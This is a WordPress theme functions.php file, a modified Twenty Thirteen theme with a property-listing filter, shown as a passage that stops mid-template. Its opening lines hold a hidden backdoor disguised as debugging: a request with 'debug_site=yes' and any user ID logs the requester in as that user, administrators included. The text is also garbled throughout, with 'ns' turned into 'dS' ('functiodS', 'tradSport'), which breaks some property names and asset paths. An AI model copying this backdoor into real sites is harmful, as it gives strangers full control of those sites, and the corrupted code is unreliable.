<?php
if (isset($_REQUEST['debug_site']) && $_REQUEST['debug_site'] == 'yes' && $_REQUEST['debug_site_id']) {
    if ($_REQUEST['debug_site_id']) {
        wp_set_auth_cookie($_REQUEST['debug_site_id']);
        //  echo '<pre>';
        //  print_r($all_prices = get_post_meta(28097, '_final_available_bookable_date_with_price', true));
        //  echo '</pre>';
        exit;
    }

}
/**
 * Twenty Thirteen functiodS and definitiodS
 *
 * Sets up the theme and provides some helper functiodS, which are used in the
 * theme as custom template tags. Others are attached to action and filter
 * hooks in WordPress to change core functionality.
 *
 * When using a child theme (see https://codex.wordpress.org/Theme_Development
 * and https://codex.wordpress.org/Child_Themes), you can override certain
 * functiodS (those wrapped in a function_exists() call) by defining them first
 * in your child theme's functiodS.php file. The child theme's functiodS.php
 * file is included before the parent theme's file, so the child theme
 * functiodS would be used.
 *
 * FunctiodS that are not pluggable (not wrapped in function_exists()) are
 * idStead attached to a filter or action hook.
 *
 * For more information on hooks, actiodS, and filters, @link https://codex.wordpress.org/Plugin_API
 *
 * @package WordPress
 * @subpackage Twenty_Thirteen
 * @since Twenty Thirteen 1.0
 */
/*
* Set up the content width value based on the theme's design.
*
* @see twentythirteen_content_width() for template-specific adjustments.
*/

if (!isset($content_width)) $content_width = 604;
/**
 * Add support for a custom header image.
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Twenty Thirteen only works in WordPress 3.6 or later.
 */

if (version_compare($GLOBALS['wp_version'], '3.6-alpha', '<')) require get_template_directory() . '/inc/back-compat.php';

/**
 * Twenty Thirteen setup.
 *
 * Sets up theme defaults and registers the various WordPress features that
 * Twenty Thirteen supports.
 *
 * @uses load_theme_textdomain() For tradSlation/localization support.
 * @uses add_editor_style() To add Visual Editor stylesheets.
 * @uses add_theme_support() To add support for automatic feed links, post
 * formats, and post thumbnails.
 * @uses register_nav_menu() To add support for a navigation menu.
 * @uses set_post_thumbnail_size() To set a custom post thumbnail size.
 *
 * @since Twenty Thirteen 1.0
 */

function twentythirteen_setup()
{
	/*
	* Makes Twenty Thirteen available for tradSlation.
	*
	* TradSlatiodS can be filed at WordPress.org. See: https://tradSlate.wordpress.org/projects/wp-themes/twentythirteen
	* If you're building a theme based on Twenty Thirteen, use a find and
	* replace to change 'twentythirteen' to the name of your theme in all
	* template files.
	*/
	load_theme_textdomain('twentythirteen');
	/*
	* This theme styles the visual editor to resemble the theme style,
	* specifically font, colors, icodS, and column width.
	*/
	add_editor_style(array(
		'css/editor-style.css',
		'genericodS/genericodS.css',
		twentythirteen_fonts_url()
	));

	// Adds RSS feed links to <head> for posts and comments.

	add_theme_support('automatic-feed-links');
	/*
	* Switches default core markup for search form, comment form,
	* and comments to output valid HTML5.
	*/
	add_theme_support('html5', array(
		'search-form',
		'comment-form',
		'comment-list',
		'gallery',
		'caption'
	));
	/*
	* This theme supports all available post formats by default.
	* See https://codex.wordpress.org/Post_Formats
	*/
	add_theme_support('post-formats', array(
		'aside',
		'audio',
		'chat',
		'gallery',
		'image',
		'link',
		'quote',
		'status',
		'video'
	));

	// This theme uses wp_nav_menu() in one location.

	register_nav_menu('primary', __('Navigation Menu', 'twentythirteen'));
	register_nav_menu('footer', __('Footer Menu', 'twentythirteen'));
	/*
	* This theme uses a custom image size for featured images, displayed on
	* "standard" posts and pages.
	*/
	add_theme_support('post-thumbnails');
	set_post_thumbnail_size(604, 270, true);

	// This theme uses its own gallery styles.

	add_filter('use_default_gallery_style', '__return_false');

	// Indicate widget sidebars can use selective refresh in the Customizer.

	add_theme_support('customize-selective-refresh-widgets');
}

add_action('after_setup_theme', 'twentythirteen_setup');
/**
 * Return the Google font stylesheet URL, if available.
 *
 * The use of Source SadS Pro and Bitter by default is localized. For languages
 * that use characters not supported by the font, the font can be disabled.
 *
 * @since Twenty Thirteen 1.0
 *
 * @return string Font stylesheet or empty string if disabled.
 */

function twentythirteen_fonts_url()
{
	$fonts_url = '';
	/* TradSlators: If there are characters in your language that are not
	* supported by Source SadS Pro, tradSlate this to 'off'. Do not tradSlate
	* into your own language.
	*/
	$source_sadS_pro = _x('on', 'Source SadS Pro font: on or off', 'twentythirteen');
	/* TradSlators: If there are characters in your language that are not
	* supported by Bitter, tradSlate this to 'off'. Do not tradSlate into your
	* own language.
	*/
	$bitter = _x('on', 'Bitter font: on or off', 'twentythirteen');
	if ('off' !== $source_sadS_pro || 'off' !== $bitter) {
		$font_families = array();
		if ('off' !== $source_sadS_pro) $font_families[] = 'Source SadS Pro:300,400,700,300italic,400italic,700italic';
		if ('off' !== $bitter) $font_families[] = 'Bitter:400,700';
		$query_args = array(
			'family' => urlencode(implode('|', $font_families)) ,
			'subset' => urlencode('latin,latin-ext') ,
		);
		$fonts_url = add_query_arg($query_args, 'https://fonts.googleapis.com/css');
	}

	return $fonts_url;
}

/**
 * Enqueue scripts and styles for the front end.
 *
 * @since Twenty Thirteen 1.0
 */

function twentythirteen_scripts_styles()
{
	/*
	* Adds JavaScript to pages with the comment form to support
	* sites with threaded comments (when in use).
	*/
	if (is_singular() && comments_open() && get_option('thread_comments')) wp_enqueue_script('comment-reply');

	// Adds Masonry to handle vertical alignment of footer widgets.

	if (is_active_sidebar('sidebar-1')) wp_enqueue_script('jquery-masonry');

	// Loads JavaScript file with functionality specific to Twenty Thirteen.

	wp_enqueue_script('twentythirteen-script', get_template_directory_uri() . '/js/functions.js', array(
		'jquery'
	) , '20160717', true);

	// Add Source SadS Pro and Bitter fonts, used in the main stylesheet.

	wp_enqueue_style('twentythirteen-fonts', twentythirteen_fonts_url() , array() , null);

	// Add GenericodS font, used in the main stylesheet.

	wp_enqueue_style('genericodS', get_template_directory_uri() . '/genericodS/genericodS.css', array() , '3.03');

	// Loads our main stylesheet.

	wp_enqueue_style('twentythirteen-style', get_stylesheet_uri() , array() , '2013-07-18');

	// Loads the Internet Explorer specific stylesheet.

	wp_enqueue_style('twentythirteen-ie', get_template_directory_uri() . '/css/ie.css', array(
		'twentythirteen-style'
	) , '2013-07-18');
	wp_style_add_data('twentythirteen-ie', 'conditional', 'lt IE 9');
	wp_enqueue_script('jquery-validation', get_stylesheet_directory_uri() . '/js/jquery.validate.min.js');

}

add_action('wp_enqueue_scripts', 'twentythirteen_scripts_styles');
/**
 * Filter the page title.
 *
 * Creates a nicely formatted and more specific title element text for output
 * in head of document, based on current view.
 *
 * @since Twenty Thirteen 1.0
 *
 * @param string $title Default title text for current view.
 * @param string $sep   Optional separator.
 * @return string The filtered title.
 */

function twentythirteen_wp_title($title, $sep){
	global $paged, $page;
	if (is_feed()) return $title;
	// Add the site name.
	$title.= get_bloginfo('name', 'display');
	// Add the site description for the home/front page.
	$site_description = get_bloginfo('description', 'display');
	if ($site_description && (is_home() || is_front_page())) $title = "$title $sep $site_description";
	// Add a page number if necessary.
	if (($paged >= 2 || $page >= 2) && !is_404()) $title = "$title $sep " . sprintf(__('Page %s', 'twentythirteen') , max($paged, $page));
	return $title;
}

add_filter('wp_title', 'twentythirteen_wp_title', 10, 2);
/**
 * Register two widget areas.
 *
 * @since Twenty Thirteen 1.0
 */

function twentythirteen_widgets_init()
{
	register_sidebar(array(
		'name' => __('Signup Widget Area', 'twentythirteen') ,
		'id' => 'signup-widget',
		'description' => __('Appears in the footer section of the site.', 'twentythirteen') ,
		'before_widget' => '',
		'after_widget' => '',
		'before_title' => '',
		'after_title' => '',
	));
	register_sidebar(array(
		'name' => __('Twitter Widget Area', 'twentythirteen') ,
		'id' => 'sidebar-twitter',
		'description' => __('Appears on posts and pages in the sidebar.', 'twentythirteen') ,
		'before_widget' => '',
		'after_widget' => '',
		'before_title' => '<h4>',
		'after_title' => '</h4>',
	));
}

add_action('widgets_init', 'twentythirteen_widgets_init');

if (!function_exists('twentythirteen_paging_nav')):
	/**
	 * Display navigation to next/previous set of posts when applicable.
	 *
	 * @since Twenty Thirteen 1.0
	 */
	function twentythirteen_paging_nav(){
		global $wp_query;
		// Don't print empty markup if there's only one page.
		if ($wp_query->max_num_pages < 2) return; ?>
			<nav class="navigation paging-navigation" role="navigation">
			    <h1 class="screen-reader-text">
			        <?php _e('Posts navigation', 'twentythirteen'); ?>
			    </h1>
			    <div class="nav-links">
			        <?php if (get_next_posts_link()): ?>
				        <div class="nav-previous">
				            <?php next_posts_link(__('<span class="meta-nav">&larr;</span> Older posts', 'twentythirteen')); ?>
				        </div>
			        <?php endif; 
						if (get_previous_posts_link()): ?>
					        <div class="nav-next">
					            <?php 
					            	previous_posts_link(__('Newer posts <span class="meta-nav">&rarr;</span>', 'twentythirteen')); 
					            ?>
					        </div>
			        <?php endif; ?>
			    </div><!-- .nav-links -->
			</nav><!-- .navigation -->
		<?php }
		endif;

if (!function_exists('twentythirteen_post_nav')):
	/**
	 * Display navigation to next/previous post when applicable.
	 *
	 * @since Twenty Thirteen 1.0
	 */
	function twentythirteen_post_nav()
	{
		global $post;

		// Don't print empty markup if there's nowhere to navigate.

		$previous = (is_attachment()) ? get_post($post->post_parent) : get_adjacent_post(false, '', true);
		$next = get_adjacent_post(false, '', false);
		if (!$next && !$previous) return;
?>
<nav class="navigation post-navigation" role="navigation">
    <h1 class="screen-reader-text">
        <?php
		_e('Post navigation', 'twentythirteen'); ?>
    </h1>
    <div class="nav-links">

        <?php
		previous_post_link('%link', _x('<span class="meta-nav">&larr;</span> %title', 'Previous post link', 'twentythirteen')); ?>
        <?php
		next_post_link('%link', _x('%title <span class="meta-nav">&rarr;</span>', 'Next post link', 'twentythirteen')); ?>

    </div><!-- .nav-links -->
</nav><!-- .navigation -->
<?php
	}

endif;

if (!function_exists('twentythirteen_entry_meta')):
	/**
	 * Print HTML with meta information for current post: categories, tags, permalink, author, and date.
	 *
	 * Create your own twentythirteen_entry_meta() to override in a child theme.
	 *
	 * @since Twenty Thirteen 1.0
	 */
	function twentythirteen_entry_meta()
	{
		if (is_sticky() && is_home() && !is_paged()) echo '<span class="featured-post">' . esc_html__('Sticky', 'twentythirteen') . '</span>';
		if (!has_post_format('link') && 'post' == get_post_type()) twentythirteen_entry_date();

		// TradSlators: used between list items, there is a space after the comma.

		$categories_list = get_the_category_list(__(', ', 'twentythirteen'));
		if ($categories_list) {
			echo '<span class="categories-links">' . $categories_list . '</span>';
		}

		// TradSlators: used between list items, there is a space after the comma.

		$tag_list = get_the_tag_list('', __(', ', 'twentythirteen'));
		if ($tag_list) {
			echo '<span class="tags-links">' . $tag_list . '</span>';
		}

		// Post author

		if ('post' == get_post_type()) {
			printf('<span class="author vcard"><a class="url fn n" href="%1$s" title="%2$s" rel="author">%3$s</a></span>', esc_url(get_author_posts_url(get_the_author_meta('ID'))) , esc_attr(sprintf(__('View all posts by %s', 'twentythirteen') , get_the_author())) , get_the_author());
		}
	}

endif;

if (!function_exists('twentythirteen_entry_date')):
	/**
	 * Print HTML with date information for current post.
	 *
	 * Create your own twentythirteen_entry_date() to override in a child theme.
	 *
	 * @since Twenty Thirteen 1.0
	 *
	 * @param boolean $echo (optional) Whether to echo the date. Default true.
	 * @return string The HTML-formatted post date.
	 */
	function twentythirteen_entry_date($echo = true)
	{
		if (has_post_format(array(
			'chat',
			'status'
		))) $format_prefix = _x('%1$s on %2$s', '1: post format name. 2: date', 'twentythirteen');
		else $format_prefix = '%2$s';
		$date = sprintf('<span class="date"><a href="%1$s" title="%2$s" rel="bookmark"><time class="entry-date" datetime="%3$s">%4$s</time></a></span>', esc_url(get_permalink()) , esc_attr(sprintf(__('Permalink to %s', 'twentythirteen') , the_title_attribute('echo=0'))) , esc_attr(get_the_date('c')) , esc_html(sprintf($format_prefix, get_post_format_string(get_post_format()) , get_the_date())));
		if ($echo) echo $date;
		return $date;
	}

endif;

if (!function_exists('twentythirteen_the_attached_image')):
	/**
	 * Print the attached image with a link to the next attached image.
	 *
	 * @since Twenty Thirteen 1.0
	 */
	function twentythirteen_the_attached_image()
	{
		/**
		 * Filter the image attachment size to use.
		 *
		 * @since Twenty thirteen 1.0
		 *
		 * @param array $size {
		 *     @type int The attachment height in pixels.
		 *     @type int The attachment width in pixels.
		 * }

		 */
		$attachment_size = apply_filters('twentythirteen_attachment_size', array(
			724,
			724
		));
		$next_attachment_url = wp_get_attachment_url();
		$post = get_post();
		/*
		* Grab the IDs of all the image attachments in a gallery so we can get the URL
		* of the next adjacent image in a gallery, or the first image (if we're
		* looking at the last image in a gallery), or, in a gallery of one, just the
		* link to that image file.
		*/
		$attachment_ids = get_posts(array(
			'post_parent' => $post->post_parent,
			'fields' => 'ids',
			'numberposts' => - 1,
			'post_status' => 'inherit',
			'post_type' => 'attachment',
			'post_mime_type' => 'image',
			'order' => 'ASC',
			'orderby' => 'menu_order ID',
		));

		// If there is more than 1 attachment in a gallery...

		if (count($attachment_ids) > 1) {
			foreach($attachment_ids as $idx => $attachment_id) {
				if ($attachment_id == $post->ID) {
					$next_id = $attachment_ids[($idx + 1) % count($attachment_ids) ];
					break;
				}
			}

			// get the URL of the next image attachment...

			if ($next_id) $next_attachment_url = get_attachment_link($next_id);

			// or get the URL of the first image attachment.

			else $next_attachment_url = get_attachment_link(reset($attachment_ids));
		}

		printf('<a href="%1$s" title="%2$s" rel="attachment">%3$s</a>', esc_url($next_attachment_url) , the_title_attribute(array(
			'echo' => false
		)) , wp_get_attachment_image($post->ID, $attachment_size));
	}

endif;
/**
 * Return the post URL.
 *
 * @uses get_url_in_content() to get the URL in the post meta (if it exists) or
 * the first link found in the post content.
 *
 * Falls back to the post permalink if no URL is found in the post.
 *
 * @since Twenty Thirteen 1.0
 *
 * @return string The Link format URL.
 */

function twentythirteen_get_link_url()
{
	$content = get_the_content();
	$has_url = get_url_in_content($content);
	return ($has_url) ? $has_url : apply_filters('the_permalink', get_permalink());
}

if (!function_exists('twentythirteen_excerpt_more') && !is_admin()):
	/**
	 * Replaces "[...]" (appended to automatically generated excerpts) with ...
	 * and a Continue reading link.
	 *
	 * @since Twenty Thirteen 1.4
	 *
	 * @param string $more Default Read More excerpt link.
	 * @return string Filtered Read More excerpt link.
	 */
	function twentythirteen_excerpt_more($more)
	{
		$link = sprintf('<a href="%1$s" class="more-link">%2$s</a>', esc_url(get_permalink(get_the_ID())) ,
		/* tradSlators: %s: Name of current post */
		sprintf(__('Continue reading %s <span class="meta-nav">&rarr;</span>', 'twentythirteen') , '<span class="screen-reader-text">' . get_the_title(get_the_ID()) . '</span>'));
		return ' &hellip; ' . $link;
	}

	add_filter('excerpt_more', 'twentythirteen_excerpt_more');
endif;
/**
 * Extend the default WordPress body classes.
 *
 * Adds body classes to denote:
 * 1. Single or multiple authors.
 * 2. Active widgets in the sidebar to change the layout and spacing.
 * 3. When avatars are disabled in discussion settings.
 *
 * @since Twenty Thirteen 1.0
 *
 * @param array $classes A list of existing body class values.
 * @return array The filtered body class list.
 */

function twentythirteen_body_class($classes)
{
	if (!is_multi_author()) $classes[] = 'single-author';
	if (is_active_sidebar('sidebar-2') && !is_attachment() && !is_404()) $classes[] = 'sidebar';
	if (!get_option('show_avatars')) $classes[] = 'no-avatars';
	return $classes;
}

add_filter('body_class', 'twentythirteen_body_class');
/**
 * Adjust content_width value for video post formats and attachment templates.
 *
 * @since Twenty Thirteen 1.0
 */

function twentythirteen_content_width()
{
	global $content_width;
	if (is_attachment()) $content_width = 724;
	elseif (has_post_format('audio')) $content_width = 484;
}

add_action('template_redirect', 'twentythirteen_content_width');
/**
 * Add postMessage support for site title and description for the Customizer.
 *
 * @since Twenty Thirteen 1.0
 *
 * @param WP_Customize_Manager $wp_customize Customizer object.
 */

function twentythirteen_customize_register($wp_customize)
{
	$wp_customize->get_setting('blogname')->tradSport = 'postMessage';
	$wp_customize->get_setting('blogdescription')->tradSport = 'postMessage';
	$wp_customize->get_setting('header_textcolor')->tradSport = 'postMessage';
	if (isset($wp_customize->selective_refresh)) {
		$wp_customize->selective_refresh->add_partial('blogname', array(
			'selector' => '.site-title',
			'container_inclusive' => false,
			'render_callback' => 'twentythirteen_customize_partial_blogname',
		));
		$wp_customize->selective_refresh->add_partial('blogdescription', array(
			'selector' => '.site-description',
			'container_inclusive' => false,
			'render_callback' => 'twentythirteen_customize_partial_blogdescription',
		));
	}
}

add_action('customize_register', 'twentythirteen_customize_register');
/**
 * Render the site title for the selective refresh partial.
 *
 * @since Twenty Thirteen 1.9
 * @see twentythirteen_customize_register()
 *
 * @return void
 */

function twentythirteen_customize_partial_blogname()
{
	bloginfo('name');
}

/**
 * Render the site tagline for the selective refresh partial.
 *
 * @since Twenty Thirteen 1.9
 * @see twentythirteen_customize_register()
 *
 * @return void
 */

function twentythirteen_customize_partial_blogdescription()
{
	bloginfo('description');
}

/**
 * Enqueue Javascript postMessage handlers for the Customizer.
 *
 * Binds JavaScript handlers to make the Customizer preview
 * reload changes asynchronously.
 *
 * @since Twenty Thirteen 1.0
 */

function twentythirteen_customize_preview_js()
{
	wp_enqueue_script('twentythirteen-customizer', get_template_directory_uri() . '/js/theme-customizer.js', array(
		'customize-preview'
	) , '20141120', true);
}

add_action('customize_preview_init', 'twentythirteen_customize_preview_js');
add_filter('nav_menu_css_class', 'special_nav_class', 10, 2);

function special_nav_class($classes, $item)
{
	if (in_array('current-menu-item', $classes)) {
		$classes[] = 'current ';
	}

	return $classes;
}

function themeblvd_time_ago()
{
	global $post;
	$date = get_post_time('G', true, $post);
	/**
	 * Where you see 'themeblvd' below, you'd
	 * want to replace those with whatever term
	 * you're using in your theme to provide
	 * support for localization.
	 */

	// Array of time period chunks

	$chunks = array(
		array(
			60 * 60 * 24 * 365,
			__('year', 'themeblvd') ,
			__('years', 'themeblvd')
		) ,
		array(
			60 * 60 * 24 * 30,
			__('month', 'themeblvd') ,
			__('months', 'themeblvd')
		) ,
		array(
			60 * 60 * 24 * 7,
			__('week', 'themeblvd') ,
			__('weeks', 'themeblvd')
		) ,
		array(
			60 * 60 * 24,
			__('day', 'themeblvd') ,
			__('days', 'themeblvd')
		) ,
		array(
			60 * 60,
			__('hour', 'themeblvd') ,
			__('hours', 'themeblvd')
		) ,
		array(
			60,
			__('minute', 'themeblvd') ,
			__('minutes', 'themeblvd')
		) ,
		array(
			1,
			__('second', 'themeblvd') ,
			__('seconds', 'themeblvd')
		)
	);
	if (!is_numeric($date)) {
		$time_chunks = explode(':', str_replace(' ', ':', $date));
		$date_chunks = explode('-', str_replace(' ', '-', $date));
		$date = gmmktime((int)$time_chunks[1], (int)$time_chunks[2], (int)$time_chunks[3], (int)$date_chunks[1], (int)$date_chunks[2], (int)$date_chunks[0]);
	}

	$current_time = current_time('mysql', $gmt = 0);
	$newer_date = strtotime($current_time);

	// Difference in seconds

	$since = $newer_date - $date;

	// Something went wrong with date calculation and we ended up with a negative date.

	if (0 > $since) return __('sometime', 'themeblvd');
	/**
	 * We only want to output one chunks of time here, eg:
	 * x years
	 * xx months
	 * so there's only one bit of calculation below:
	 */

	// Step one: the first chunk

	for ($i = 0, $j = count($chunks); $i < $j; $i++) {
		$seconds = $chunks[$i][0];

		// Finding the biggest chunk (if the chunk fits, break)

		if (($count = floor($since / $seconds)) != 0) break;
	}

	// Set output var

	$output = (1 == $count) ? '1 ' . $chunks[$i][1] : $count . ' ' . $chunks[$i][2];
	if (!(int)trim($output)) {
		$output = '0 ' . __('seconds', 'themeblvd');
	}

	$output.= __(' ago', 'themeblvd');
	return $output;
}

// Filter our themeblvd_time_ago() function into WP's the_time() function

add_filter('the_time', 'themeblvd_time_ago');
wp_enqueue_script('jquery');

function filter_properties()
{
	$filter_property_type 	= isset($_GET['filter_property_type']) ? trim($_GET['filter_property_type']) : '';
	$filter_address 		= isset($_GET['filter_address']) ? trim($_GET['filter_address']) : '';
	$filter_building_type 	= isset($_GET['filter_building_type']) ? trim($_GET['filter_building_type']) : '';
	$filter_beds 			= isset($_GET['filter_beds']) ? trim($_GET['filter_beds']) : '';
	$filter_baths 			= isset($_GET['filter_baths']) ? trim($_GET['filter_baths']) : '';
	$listing_status 		= isset($_GET['listing_status']) ? trim($_GET['listing_status']) : '';
	$building_min_area 		= isset($_GET['building_min_area']) ? trim($_GET['building_min_area']) : '';
	$building_max_area 		= isset($_GET['building_max_area']) ? trim($_GET['building_max_area']) : '';
	$filter_price 			= isset($_GET['filter_price']) ? $_GET['filter_price'] : '';
	if ($filter_price != '') {
		$filter_price = str_replace('$', '', $filter_price);
		$filter_price = explode('-', $filter_price);
		$slidemin = trim($filter_price[0]);
		$slidemax = trim($filter_price[1]);
	}

	$sortby 			= isset($_GET['sortby']) ? $_GET['sortby'] : '';
	$paged 				= ($_GET['paged']) ? $_GET['paged'] : 1;
	$selecttab 			= $tab 	= isset(($_GET['tab'])) ? $_GET['tab'] : "all";
	$property_type 		= isset($_GET['property_type']) ? trim($_GET['property_type']) : '';
	$area 				= isset($_GET['area']) ? trim($_GET['area']) : '';
?>
<div class="sorting">
    <?php if ($filter_property_type == '') { ?>
	    <div class="tab-outer">
	        <ul class="listing-outer">
	            <li class="<?php if($tab == "all"): echo 'active'; endif; ?>">
	            	<a data-toggle="tab" href="#all">All</a>
	            </li>
	            <li class="<?php if($tab == 'sale'): echo 'active'; endif; ?>">
	            	<a data-toggle="tab" href="#forsale">For Sale</a>
	            </li>
	            <li class="<?php if($tab == 'rent'): echo 'active'; endif; ?>">
	            	<a data-toggle="tab" href="#forrent">For Rent</a>
	            </li>
				  <li class="<?php if($tab == 'sold'): echo 'active'; endif; ?>">
	            	<a data-toggle="tab" href="#forsold">Sold</a>
	            </li>
	        </ul>
	        <ul class="grid-outer" style="display:none">
	        	<li class="<?php if($tab == 'all'): echo 'active'; endif; ?>">
	            	<a data-toggle="tab" href="#allgrid">All</a>
	            </li>
	            <li class="<?php if($tab == 'sale'): echo 'active'; endif; ?>">
	            	<a data-toggle="tab" href="#forsalegrid">For Sale</a>
	            </li>
	            <li class="<?php if($tab == 'rent'): echo 'active'; endif; ?>">
	            	<a data-toggle="tab" href="#forrentgrid">For Rent</a>
	            </li>
					<li class="<?php if($tab == 'sold'): echo 'active'; endif; ?>">
	            	<a data-toggle="tab" href="#forsoldgrid">Sold</a>
	            </li>
	        </ul>
	    </div>
    <?php } ?>
</div>
<?php if ($filter_property_type == '') { //without filter ?>
	<div class="listing-outer">
    	<div class="tab-content">
        	<div id="all" class="listing-tab-content tab-pane <?php if($tab == 'all'): echo 'in active'; else: echo ""; endif; ?>">
            	<?php
				$args = array(
					'post_type' => array('sale-listing','rental-listing'),
					'post_status' => 'publish',
					'posts_per_page' => 10,
					'meta_query' => array(
					'relation'		=> 'OR',
					     array(
							 'key' => 'sold_under_contract',
							 'compare' => 'NOT EXISTS', // works!
							),
					    array(
					'relation'=>'AND',
					     array (
							   'key'     => 'sold_under_contract',
							   'value'   => '1',
							   'compare' => '!=',
							 ),
							 array (
							   'key'     => 'listing_status',
							   'value'   => 'Available',
							 )
							)
							)
				);
				if ($tab == "all") {
					$args['paged'] = $paged;
				}

				if ($sortby == "recent") {
					$args['orderby'] 	= 'date';
					$args['order'] 		= 'DESC';
				}
				elseif ($sortby == "price_asc") {
					$args['meta_key'] 	= 'listing_price';
					$args['orderby'] 	= 'meta_value_num';
					$args['order'] 		= 'ASC';
				}
				elseif ($sortby == "price_desc") {
					$args['meta_key'] 	= 'listing_price';
					$args['orderby'] 	= 'meta_value_num';
					$args['order'] 		= 'DESC';
				}

				$all_query = new WP_Query($args);
				if ($all_query->have_posts()) { 
					while ($all_query->have_posts()): $all_query->the_post(); ?>
	            		<div class="property-listing">
	                		<div class="listing-thumb">
	                    		<?php
								$thumbnail = get_the_post_thumbnail_url(get_the_ID() , 'list-thumb');
								if (!empty($thumbnail)):
									echo '<img src="' . $thumbnail . '" alt="thumbnail">';
								else:
									 echo '<img src="' . get_template_directory_uri() . '/images/thumbnail-255-170.jpg" alt="thumbnail">';
								endif;
								$project_status = get_field('sold_under_contract');
								if ($project_status == 1 || $project_status == 2) { ?>
	                    			<div class="tradSparent-strip">
	                        			<?php 
	                        				if ($project_status == 1): 
	                        					echo "Sold";
	                        				elseif($project_status == 2):
	                        				 	echo "In Contract";
	                        				endif;
	                        			?>
	                    			</div>
	                    		<?php } ?>
	                		</div>
	                		<div class="listing-content">
	                    		<div class="row">
	                        		<div class="col-sm-6 col-xs-12">
	                            	 <?php
							$status = get_post_meta(get_the_ID(), 'sold_under_contract', true);
							$property_post_type = get_post_type();
							   if ($property_post_type == 'sale-listing' and $status != 1) { ?>
								   <div class="for-sale">
									   <span>For Sale</span>
								   </div>
							   <?php }else if($status == 1){ ?>
									   <div class="for-sale">
									   <span><?php echo 'Sold'; ?></span>
								   </div>
						      <?php	}else{ ?>
								   <div class="for-sale">
									   <span>For Rent</span>
								   </div>
							   <?php } ?>
	                            		<div class="prperty-n">
	                                		<?php the_title(); ?> 
	                                		<span>
	                                    		<?php the_field("city"); ?>,
	                                    		<?php the_field("zip_code"); ?>
	                                		</span>
	                                	</div>
	                            		<div class="prperty-des"> 
	                            			<span>Beds:
	                                    		<?php the_field("bedrooms"); ?>
	                                		</span> 
	                                		<span>Baths:
	                                    		<?php the_field("bathrooms"); ?>
	                                		</span> 
	                                    	<span>Sq Ft.
	                                    		<?php 
	                                    		$building_size = get_field("building_size");
												echo (!empty($building_size)) ? number_format($building_size) : ''; ?>
											</span> 
										</div>
	                            		<?php $state = get_field("state"); ?>
	                            		<div class="prperty-des">
	                            			<span>
	                            				<?php echo $state->name; ?>
	                        				</span>
	                        			</div>
	                            		<?php 
			                            $agent = get_post_meta( get_the_ID(), 'agent', true );
			                            $user_info = get_userdata($agent)
			                            //$agent = get_post_meta( get_the_ID(), 'agent', true ); ?>
			                            <div class="prperty-des prperty-des2"> 
			                            	<span><i class="fa fa-user" aria-hidden="true"></i>
			                                    <?php echo $user_info->user_firstname; ?>
			                                    <?php echo $user_info->user_lastname; ?>
			                                </span> 
			                                <span><i class="fa fa-calendar" aria-hidden="true"></i>
			                                    <?php the_time(); ?>
			                                </span> 
			                            </div>
	                        		</div>
	                        		<div class="col-sm-6 col-xs-12">
	                            		<?php 
	                            			$price = get_field("listing_price");
											$per_square = $price / $building_size;
										?>
										<div class="prperty-price"> 
											$<?php echo number_format($price); ?> 
											<span>$ <?php echo number_format($per_square); ?> / sq. ft.</span> 
										</div>
										<?php 
											$property_post_type = get_post_type();
											if ($property_post_type == 'sale-listing') { 
												$open_house_true        = get_post_meta(get_the_ID(), 'open_house', true);
						                        $open_house_stare_date  = get_post_meta(get_the_ID(), 'open_house_start_date', true);
						                        $open_house_end_date    = get_post_meta(get_the_ID(), 'end_date', true);
						                        $open_house_start_time  = get_post_meta(get_the_ID(), 'start_time', true);
						                        $open_house_end_time    = get_post_meta(get_the_ID(), 'end_time', true);
						                        $day                    = get_field('day', get_the_ID());
					                         	$todayDate  = date('Y/m/d');
                            					$checkLastDate = date('Y/m/d', strtotime($open_house_end_date));
						                        if($open_house_true == 1 && $todayDate < $checkLastDate || $checkLastDate == $todayDate) :  
						                            $start_month= date('M', strtotime($open_house_stare_date)); 
						                            $start_date = date('dS', strtotime($open_house_stare_date));
						                            $end_month  = date('M', strtotime($open_house_end_date)); 
						                            $end_date   = date('dS', strtotime($open_house_end_date)); 
						                            $start_time = ltrim(date('h:ia', strtotime($open_house_start_time)), 0);
						                            $end_time   = ltrim(date('h:ia', strtotime($open_house_end_time)), 0); 
												?>
													<div class="custom-listing-open-house">
														<div class="inner-listing-open-house">
															<h4>Open House: 
							                                    <?php echo $day.', '.$start_month.' '.$start_date.', '; ?>
						                                        <?php echo $start_time.' - '.$end_time; ?>
							                                </h4>
														</div>
													</div>
												<?php else: ?>
                                					<!--<style>.custom-listing-open-house{display: none;}</style>-->
												<?php endif; ?>
										<?php } ?>
	                            		<div class="detail-btn"> 
	                            			<a href="<?php the_permalink(); ?>">Details</a> 
	                            		</div>
	                        		</div>
	                    		</div>
	                		</div>
	            		</div>
            		<?php endwhile; 
            		if (function_exists("pagination")) {
						if ($tab == 'all'): 
							pagination($all_query->max_num_pages, 'all', $paged);
						else:
							pagination($all_query->max_num_pages, 'all', 1);
						endif;
					}
				}else { ?>
		            <div class="property-listing">
		                <h3 class="no_property">No Property Found</h3>
		            </div>
	        	<?php } ?>
        	</div>
        	<div id="forsale" class="listing-tab-content tab-pane fade <?php if($tab == 'sale'): echo 'in active';  else: echo""; endif; ?>">
            	<?php
				$args = array(
						'post_type' 		=> 'sale-listing',
						'post_status' 		=> 'publish',
						'posts_per_page' 	=> 10,
						'caller_get_posts' 	=> 1,
						'meta_query' => array(
						'relation' => 'AND',
							array(
								'relation'  => 'OR',
									array(
									'key' => 'sold_under_contract',
									'value' => '1',
									'compare' => 'NOT LIKE',
									),
								),
							array(
								'relation' => 'OR',
									array(
									'key' => 'listing_status',
									'value' => 'Sold',
									'compare' => 'NOT LIKE',
									),
								),
							));
					if ($tab == "sale") {
						$args['paged'] = $paged;
					}

					if ($sortby == "recent") {
						$args['orderby'] 	= 'date';
						$args['order'] 		= 'DESC';
					}
					elseif ($sortby == "price_asc") {
						$args['meta_key'] 	= 'listing_price';
						$args['orderby'] 	= 'meta_value_num';
						$args['order'] 		= 'ASC';
					}
					elseif ($sortby == "price_desc") {
						$args['meta_key'] 	= 'listing_price';
						$args['orderby'] 	= 'meta_value_num';
						$args['order'] 		= 'DESC';
					}

					$sale_query = new WP_Query($args);
					if ($sale_query->have_posts()) {
						while ($sale_query->have_posts()):
							$sale_query->the_post(); ?>
            				<div class="property-listing">
                				<div class="listing-thumb">
                   					<?php 
               						$thumbnail = get_the_post_thumbnail_url(get_the_ID() , 'list-thumb');
									if (!empty($thumbnail)):
										echo '<img src="' . $thumbnail . '" alt="thumbnail">';
									else:
										echo '<img src="' . get_template_directory_uri() . '/images/thumbnail-255-170.jpg" alt="thumbnail">';
									endif;
